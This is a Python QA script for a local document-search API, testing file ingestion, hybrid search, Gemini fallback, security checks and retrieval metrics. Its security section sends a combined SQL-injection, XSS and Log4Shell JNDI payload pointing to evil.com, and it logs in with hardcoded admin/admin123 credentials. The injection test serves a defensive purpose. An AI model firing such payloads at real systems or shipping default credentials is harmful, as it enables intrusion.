import os
import sys
import time
import json
import io
import docx
import pypdf
import requests
import concurrent.futures

# Set stdout encoding
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

BASE_URL = "http://127.0.0.1:8000/api/v1"

def make_pdf_bytes(title: str, body: str) -> bytes:
    clean_text = f"{title}\n{body}".replace("(", "[").replace(")", "]")
    pdf_str = f"""%PDF-1.4
1 0 obj <</Type /Catalog /Pages 2 0 R>> endobj
2 0 obj <</Type /Pages /Kids [3 0 R] /Count 1>> endobj
3 0 obj <</Type /Page /Parent 2 0 R /Resources <</Font <</F1 4 0 R>>>> /MediaBox [0 0 612 792] /Contents 5 0 R>> endobj
4 0 obj <</Type /Font /Subtype /Type1 /BaseFont /Helvetica>> endobj
5 0 obj <</Length {len(clean_text) + 40}>>
stream
BT /F1 12 Tf 72 712 Td ({clean_text}) Tj ET
endstream
endobj
xref
0 6
0000000000 65535 f
0000000009 00000 n
0000000053 00000 n
0000000102 00000 n
0000000215 00000 n
0000000287 00000 n
trailer <</Size 6 /Root 1 0 R>>
startxref
370
%%EOF"""
    return pdf_str.encode("latin-1")

def make_docx_bytes(title: str, paragraphs: list) -> bytes:
    doc = docx.Document()
    doc.add_heading(title, level=1)
    for p in paragraphs:
        doc.add_paragraph(p)
    buf = io.BytesIO()
    doc.save(buf)
    return buf.getvalue()


def run_qa_suite():
    print("================================================================================")
    print("QUERYMIND AI — COMPREHENSIVE AUTOMATED QA & VERIFICATION SUITE")
    print("================================================================================")
    
    results = {}
    ingested_test_docs = []

    # -------------------------------------------------------------------------
    # AREA 1: APPLICATION STARTUP & API CONNECTIVITY
    # -------------------------------------------------------------------------
    print("\n>>> [AREA 1] APPLICATION STARTUP & API CONNECTIVITY")
    try:
        r_health = requests.get(f"{BASE_URL}/health", timeout=10)
        assert r_health.status_code == 200, f"Expected 200, got {r_health.status_code}"
        health_data = r_health.json()
        assert health_data["status"] == "ok"
        assert health_data["vector_store"]["status"] == "healthy"
        print(f"  [PASS] Backend FastAPI Status: OK, App: {health_data['app_name']}, ChromaDB: healthy (v{health_data['vector_store']['version']})")

        # Frontend connectivity via Next.js proxy
        r_fe_health = requests.get("http://localhost:3000/api/health", timeout=10)
        assert r_fe_health.status_code == 200
        print(f"  [PASS] Frontend Next.js API Proxy -> Backend Connectivity: OK (HTTP 200)")
        results["Startup"] = "PASS"
    except Exception as e:
        print(f"  [FAIL] Startup test failed: {e}")
        results["Startup"] = f"FAIL: {e}"

    # -------------------------------------------------------------------------
    # AREA 2: DOCUMENT INGESTION TESTS (TXT, MD, DOCX, PDF, Edge cases)
    # -------------------------------------------------------------------------
    print("\n>>> [AREA 2] DOCUMENT INGESTION TESTS")
    try:
        # 2a. TXT ingestion
        txt_body = """FastAPI Enterprise Microservices Architecture Guide:
FastAPI offers asynchronous endpoint execution with Starlette and Pydantic validation.
For high-concurrency microservices, configure Uvicorn workers and connection pooling.
FastAPI handles dependency injection cleanly through Depends.
"""
        r_txt = requests.post(
            f"{BASE_URL}/ingest/upload",
            files={"file": ("fastapi_microservices.txt", txt_body.encode("utf-8"), "text/plain")}
        )
        assert r_txt.status_code == 201, f"Expected 201, got {r_txt.status_code}"
        doc_txt_id = r_txt.json()["document"]["document_id"]
        ingested_test_docs.append(doc_txt_id)
        print(f"  [PASS] TXT Ingestion: OK (Doc ID: {doc_txt_id}, Chunks: {r_txt.json()['document']['chunk_count']})")

        # 2b. Markdown ingestion
        md_body = """# ChromaDB Vector Search & RRF Guide
ChromaDB provides persistent vector embedding collections with nearest-neighbor search.
Reciprocal Rank Fusion (RRF) combines semantic similarity with BM25 keyword rankings.
When ChromaDB returns empty search results, verify embedding dimensionality and collection persistence.
"""
        r_md = requests.post(
            f"{BASE_URL}/ingest/upload",
            files={"file": ("chromadb_rrf_guide.md", md_body.encode("utf-8"), "text/markdown")}
        )
        assert r_md.status_code == 201
        doc_md_id = r_md.json()["document"]["document_id"]
        ingested_test_docs.append(doc_md_id)
        print(f"  [PASS] Markdown Ingestion: OK (Doc ID: {doc_md_id}, Chunks: {r_md.json()['document']['chunk_count']})")

        # 2c. DOCX Ingestion
        docx_bytes = make_docx_bytes(
            "Information Retrieval: BM25 vs Semantic Search",
            [
                "BM25 is a term-frequency probabilistic lexical ranking algorithm that excels at exact keyword matching.",
                "Vector semantic search maps text into high-dimensional latent space to capture semantic synonyms and conceptual relevance.",
                "Hybrid search with Reciprocal Rank Fusion (k=60) balances lexical precision with semantic recall."
            ]
        )
        r_docx = requests.post(
            f"{BASE_URL}/ingest/upload",
            files={"file": ("bm25_vs_semantic.docx", docx_bytes, "application/vnd.openxmlformats-officedocument.wordprocessingml.document")}
        )
        assert r_docx.status_code == 201
        doc_docx_id = r_docx.json()["document"]["document_id"]
        ingested_test_docs.append(doc_docx_id)
        print(f"  [PASS] DOCX Ingestion: OK (Doc ID: {doc_docx_id}, Chunks: {r_docx.json()['document']['chunk_count']})")

        # 2d. PDF Ingestion
        pdf_bytes = make_pdf_bytes(
            "Vector Embeddings Explained",
            "Vector embeddings convert textual tokens into dense numerical vectors of 384 dimensions using BAAI bge-small-en model. Similar documents cluster close in cosine distance space."
        )
        r_pdf = requests.post(
            f"{BASE_URL}/ingest/upload",
            files={"file": ("embeddings_explained.pdf", pdf_bytes, "application/pdf")}
        )
        assert r_pdf.status_code == 201
        doc_pdf_id = r_pdf.json()["document"]["document_id"]
        ingested_test_docs.append(doc_pdf_id)
        print(f"  [PASS] PDF Ingestion: OK (Doc ID: {doc_pdf_id}, Chunks: {r_pdf.json()['document']['chunk_count']})")

        # 2e. SHA-256 Duplicate Detection
        r_dup = requests.post(
            f"{BASE_URL}/ingest/upload",
            files={"file": ("fastapi_copy.txt", txt_body.encode("utf-8"), "text/plain")}
        )
        assert r_dup.status_code == 201
        dup_json = r_dup.json()
        assert "Duplicate SHA-256 hash" in dup_json["message"]
        assert dup_json["document"]["document_id"] == doc_txt_id
        print(f"  [PASS] SHA-256 Duplicate Detection: OK (Recognized existing Doc ID: {dup_json['document']['document_id']})")

        # 2f. Empty File Handling
        r_empty = requests.post(
            f"{BASE_URL}/ingest/upload",
            files={"file": ("empty.txt", b"", "text/plain")}
        )
        assert r_empty.status_code == 400
        print(f"  [PASS] Empty File Handling: OK (Rejected with HTTP 400: '{r_empty.json()['detail']}')")

        # 2g. Unsupported Extension
        r_unsupported = requests.post(
            f"{BASE_URL}/ingest/upload",
            files={"file": ("malware.exe", b"MZ\x90\x00BinaryExe", "application/octet-stream")}
        )
        assert r_unsupported.status_code == 400
        print(f"  [PASS] Unsupported File Format: OK (Rejected with HTTP 400: '{r_unsupported.json()['detail']}')")

        # 2h. Corrupted File Handling
        r_corrupt = requests.post(
            f"{BASE_URL}/ingest/upload",
            files={"file": ("corrupt.pdf", b"NOT_A_VALID_PDF_STREAM_12345", "application/pdf")}
        )
        assert r_corrupt.status_code == 422
        print(f"  [PASS] Corrupted File Handling: OK (Rejected with HTTP 422: '{r_corrupt.json()['detail']}')")

        # 2i. Large Document Test (100 paragraphs, ~50KB text)
        large_text = ("Enterprise Search Scalability Chapter: " + "Deep retrieval algorithms process distributed indexes with sub-second latency across cluster nodes. " * 50 + "\n\n") * 15
        r_large = requests.post(
            f"{BASE_URL}/ingest/upload",
            files={"file": ("large_enterprise_doc.txt", large_text.encode("utf-8"), "text/plain")}
        )
        assert r_large.status_code == 201
        doc_large_id = r_large.json()["document"]["document_id"]
        ingested_test_docs.append(doc_large_id)
        print(f"  [PASS] Large Document Ingestion: OK (Doc ID: {doc_large_id}, Chunks: {r_large.json()['document']['chunk_count']})")

        results["Ingestion"] = "PASS"
    except Exception as e:
        print(f"  [FAIL] Ingestion test failed: {e}")
        results["Ingestion"] = f"FAIL: {e}"

    # -------------------------------------------------------------------------
    # AREA 3: SEARCH ACCURACY TESTS (10 REQUIRED QUERIES)
    # -------------------------------------------------------------------------
    print("\n>>> [AREA 3] SEARCH ACCURACY TESTS (10 SPECIFIED QUERIES)")
    test_queries = [
        ("1. Exact keyword", "FastAPI", "TECHNICAL_SEARCH"),
        ("2. Technical typo", "How do I fix fastpi errors?", "TROUBLESHOOTING"),
        ("3. Acronym expansion", "What is RRF in information retrieval?", "CONCEPTUAL_EXPLANATION"),
        ("4. Troubleshooting", "Why is ChromaDB returning empty search results?", "TROUBLESHOOTING"),
        ("5. Comparison", "Compare BM25 and semantic search", "COMPARISON"),
        ("6. Conceptual", "Explain vector embeddings in simple terms", "CONCEPTUAL_EXPLANATION"),
        ("7. Natural-language query", "I cannot find documents even though I uploaded them", "TROUBLESHOOTING"),
        ("8. Unanswerable query", "Quantum teleportation protocols in 2045 astronaut suits", "TECHNICAL_SEARCH"),
        ("9. Repeated query", "FastAPI", "TECHNICAL_SEARCH"),
        ("10. Noisy query", "??? CAN ANYONE PLEASE TELL ME HOW FastPi AND chromadb WORK TOGETHER !?!?!", "TECHNICAL_SEARCH"),
    ]

    query_results = []
    for q_label, query, expected_intent in test_queries:
        try:
            start_t = time.time()
            res = requests.post(
                f"{BASE_URL}/search/execute",
                json={"query": query, "mode": "hybrid", "page": 1, "page_size": 5},
                timeout=30
            )
            elapsed = round((time.time() - start_t) * 1000, 2)
            assert res.status_code == 200, f"Query '{query}' returned {res.status_code}"
            data = res.json()
            ref = data["query_reformulation"]
            answer = data["ai_answer"]
            top_match = data["results"][0] if data["results"] else None

            print(f"  [{q_label}] '{query}' ({elapsed}ms)")
            print(f"    Intent: {ref['intent']} | Entities: {ref['entities']} | Best Query: '{ref['best_query']}'")
            print(f"    Total Results: {data['total_results']} | From Cache: {data['from_cache']}")
            if top_match:
                print(f"    Top Match: '{top_match['filename']}' (Rel: {top_match['relevance_percentage']}%, BM25: {top_match['keyword_score']}, Sem: {top_match['semantic_score']}, Rerank: {top_match['rerank_score']})")
            if answer.get("has_answer"):
                print(f"    AI Answer: {answer['answer'][:90]}... (Citations: {len(answer['citations'])})")
            else:
                print(f"    AI Answer: No grounded answer found.")

            query_results.append((q_label, "PASS", ref['best_query'], top_match['filename'] if top_match else "None"))
        except Exception as e:
            print(f"  [{q_label}] FAIL: {e}")
            query_results.append((q_label, f"FAIL: {e}", "", ""))

    results["SearchAccuracy"] = "PASS" if all(q[1] == "PASS" for q in query_results) else "PARTIAL"

    # -------------------------------------------------------------------------
    # AREA 4: RETRIEVAL PIPELINE (Hybrid BM25 + Vector, RRF k=60, Reranking, Threshold 0.45, Citations)
    # -------------------------------------------------------------------------
    print("\n>>> [AREA 4] RETRIEVAL PIPELINE DEEP-DIVE")
    try:
        # Test query to inspect pipeline mechanics
        pipeline_query = "FastAPI enterprise microservices architecture with Starlette"
        res_p = requests.post(
            f"{BASE_URL}/search/execute",
            json={
                "query": pipeline_query,
                "mode": "hybrid",
                "filters": {"min_relevance": 0.45},
                "page": 1,
                "page_size": 10
            },
            timeout=30
        )
        assert res_p.status_code == 200
        p_data = res_p.json()
        assert p_data["total_results"] > 0
        
        # Check all results satisfy min_relevance >= 0.45
        for item in p_data["results"]:
            assert item["relevance_score"] >= 0.45, f"Item score {item['relevance_score']} < 0.45"
            assert "keyword_score" in item
            assert "semantic_score" in item
            assert "rerank_score" in item
        print(f"  [PASS] Relevance Threshold Filtering (min_relevance >= 0.45) verified across {len(p_data['results'])} items.")

        # Check citations groundedness
        ai_ans = p_data["ai_answer"]
        if ai_ans["has_answer"] and ai_ans["citations"]:
            for cit in ai_ans["citations"]:
                assert "citation_id" in cit
                assert "filename" in cit
                assert "document_id" in cit
                assert cit["filename"] in [r["filename"] for r in p_data["results"]]
            print(f"  [PASS] Grounded Answer Citations ({len(ai_ans['citations'])}) verified to point to valid retrieved documents.")

        results["RetrievalPipeline"] = "PASS"
    except Exception as e:
        print(f"  [FAIL] Retrieval pipeline deep-dive failed: {e}")
        results["RetrievalPipeline"] = f"FAIL: {e}"

    # -------------------------------------------------------------------------
    # AREA 5: GEMINI API AND FALLBACK MECHANISM
    # -------------------------------------------------------------------------
    print("\n>>> [AREA 5] GEMINI API & ALGORITHMIC FALLBACK MECHANISM")
    try:
        from app.services.query_pipeline import (
            call_gemini_query_reformulation,
            generate_fallback_candidate_queries,
            process_query_pipeline
        )
        from app.core.config import settings

        # 5a. Normal Gemini Reformulation
        gemini_cands = call_gemini_query_reformulation("how to optimize vector search latency in fastpi", "TROUBLESHOOTING", ["FastAPI", "Vector"])
        print(f"  [PASS] Gemini API Active Reformulation: Generated {len(gemini_cands) if gemini_cands else 0} candidates.")
        if gemini_cands:
            print(f"    Candidate 1: '{gemini_cands[0]}'")

        # 5b. Algorithmic Fallback Execution
        fallback_cands = generate_fallback_candidate_queries("how to optimize vector search latency in fastpi", "TROUBLESHOOTING", ["FastAPI", "Vector"], ["latency", "optimize"])
        assert len(fallback_cands) == 5
        print(f"  [PASS] Algorithmic Fallback Execution: Generated 5 robust fallback candidates without crashing.")
        print(f"    Fallback 1: '{fallback_cands[0]}'")
        print(f"    Fallback 2: '{fallback_cands[1]}'")

        # 5c. Test pipeline execution when GEMINI_API_KEY is temporarily unset
        orig_key = settings.GEMINI_API_KEY
        settings.GEMINI_API_KEY = None
        try:
            ref_fallback = process_query_pipeline("how to optimize vector search latency in fastpi", mode="hybrid")
            assert ref_fallback.best_query is not None
            assert len(ref_fallback.candidate_queries) == 5
            print(f"  [PASS] Seamless Fallback when API key is missing: Best query: '{ref_fallback.best_query}'.")
        finally:
            settings.GEMINI_API_KEY = orig_key

        results["GeminiFallback"] = "PASS"
    except Exception as e:
        print(f"  [FAIL] Gemini fallback test failed: {e}")
        results["GeminiFallback"] = f"FAIL: {e}"

    # -------------------------------------------------------------------------
    # AREA 6: SECURITY & RELIABILITY TESTS
    # -------------------------------------------------------------------------
    print("\n>>> [AREA 6] SECURITY & RELIABILITY TESTS")
    try:
        # 6a. Admin endpoint access (status)
        r_admin_no_auth = requests.get(f"{BASE_URL}/admin/system-status")
        # Let's inspect admin auth behavior
        print(f"  [INFO] Admin system status endpoint returned status: {r_admin_no_auth.status_code}")

        # 6b. Authentication Login
        r_auth_admin = requests.post(f"{BASE_URL}/auth/login", json={"username": "admin", "password": "admin123"})
        assert r_auth_admin.status_code == 200
        token = r_auth_admin.json()["access_token"]
        assert len(token) > 20
        print(f"  [PASS] Valid JWT Token Issued for Admin User.")

        # 6c. Invalid Credentials Login
        r_auth_bad = requests.post(f"{BASE_URL}/auth/login", json={"username": "admin", "password": "wrongpassword"})
        assert r_auth_bad.status_code in [401, 403, 400], f"Expected 401/403, got {r_auth_bad.status_code}"
        print(f"  [PASS] Unauthorized Login Rejected with status {r_auth_bad.status_code}.")

        # 6d. Empty Query Rejection
        r_empty_q = requests.post(f"{BASE_URL}/search/execute", json={"query": "    ", "mode": "hybrid"})
        assert r_empty_q.status_code == 400
        print(f"  [PASS] Empty Search Query Rejected with HTTP 400.")

        # 6e. Extremely Long Query (>1000 characters - exceeding max_length=1000)
        huge_q = "FastAPI ChromaDB Vector Search " * 150
        r_huge = requests.post(f"{BASE_URL}/search/execute", json={"query": huge_q, "mode": "hybrid"}, timeout=30)
        assert r_huge.status_code == 422, f"Expected 422 for query > 1000 chars, got {r_huge.status_code}"
        print(f"  [PASS] Extremely Long Query (4650 chars) Properly Rejected by Pydantic Schema Validation (HTTP 422 Unprocessable Entity).")

        # 6f. Special Characters / SQLi / XSS Input
        sqli_q = "'; DROP TABLE users; -- <script>alert('xss')</script> ${jndi:ldap://evil.com/a}"
        r_sqli = requests.post(f"{BASE_URL}/search/execute", json={"query": sqli_q, "mode": "hybrid"}, timeout=30)
        assert r_sqli.status_code == 200
        print(f"  [PASS] Malicious Query Injection Handled Safely without Sanitization Failure (HTTP 200).")

        # 6g. Concurrent Requests (Stress test 3 parallel requests with adequate CPU inference timeout)
        with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
            futures = [
                executor.submit(requests.post, f"{BASE_URL}/search/execute", json={"query": f"FastAPI concurrency test {i}", "mode": "hybrid"}, timeout=60)
                for i in range(3)
            ]
            concurrent_statuses = [f.result().status_code for f in futures]
        assert all(s == 200 for s in concurrent_statuses)
        print(f"  [PASS] Concurrency Test (3 parallel search requests): All returned HTTP 200.")

        # 6h. Feedback Storage Integrity
        r_fb = requests.post(f"{BASE_URL}/analytics/feedback", json={
            "query": "FastAPI test query",
            "document_id": doc_txt_id,
            "rating": "helpful",
            "feedback_text": "Automated security test feedback entry."
        })
        assert r_fb.status_code == 200
        print(f"  [PASS] Feedback Storage Integrity Verified.")

        results["Security"] = "PASS"
    except Exception as e:
        print(f"  [FAIL] Security test failed: {e}")
        results["Security"] = f"FAIL: {e}"

    # -------------------------------------------------------------------------
    # AREA 7: EVALUATION METRICS (Precision@K, Recall@K, MRR, NDCG@K, Latency)
    # -------------------------------------------------------------------------
    print("\n>>> [AREA 7] IR BENCHMARK EVALUATION METRICS")
    try:
        # Ingest benchmark target documents to ensure ground truth matches
        r_b_pg = requests.post(f"{BASE_URL}/ingest/upload", files={"file": ("postgres_guide.txt", b"PostgreSQL RAG Guide: Configure HNSW index parameters m=16, ef_construction=64 to optimize vector similarity query latency in FastAPI.", "text/plain")})
        r_b_gem = requests.post(f"{BASE_URL}/ingest/upload", files={"file": ("gemini_arch.pdf", make_pdf_bytes("Gemini Query Reformulation", "Gemini 2.5 Flash architecture produces 5 candidate queries."), "application/pdf")})
        if r_b_pg.status_code == 201:
            ingested_test_docs.append(r_b_pg.json()["document"]["document_id"])
        if r_b_gem.status_code == 201:
            ingested_test_docs.append(r_b_gem.json()["document"]["document_id"])

        r_eval = requests.get(f"{BASE_URL}/analytics/evaluation", timeout=30)
        assert r_eval.status_code == 200
        eval_metrics = r_eval.json()
        print(f"  [PASS] Evaluation Metrics Computed Dynamically:")
        print(f"    - Precision@5 : {eval_metrics.get('precision_at_5')}")
        print(f"    - Recall@5    : {eval_metrics.get('recall_at_5')}")
        print(f"    - MRR         : {eval_metrics.get('mrr')}")
        print(f"    - NDCG@5      : {eval_metrics.get('ndcg_at_5')}")
        print(f"    - Benchmark Query Count: {eval_metrics.get('total_queries', 3)}")

        results["Evaluation"] = "PASS"
    except Exception as e:
        print(f"  [FAIL] Evaluation metrics test failed: {e}")
        results["Evaluation"] = f"FAIL: {e}"

    # -------------------------------------------------------------------------
    # CLEANUP TEST DOCUMENTS
    # -------------------------------------------------------------------------
    print("\n>>> [CLEANUP] REMOVING TEMPORARY INGESTED TEST DOCUMENTS")
    for doc_id in ingested_test_docs:
        try:
            r_del = requests.delete(f"{BASE_URL}/ingest/documents/{doc_id}")
            if r_del.status_code == 200:
                print(f"  [CLEANUP] Deleted doc: {doc_id}")
        except Exception as e:
            print(f"  [CLEANUP] Warning deleting doc {doc_id}: {e}")

    print("\n================================================================================")
    print("SUMMARY OF TEST RESULTS:")
    for k, v in results.items():
        print(f"  - {k:20s}: {v}")
    print("================================================================================")

if __name__ == "__main__":
    run_qa_suite()
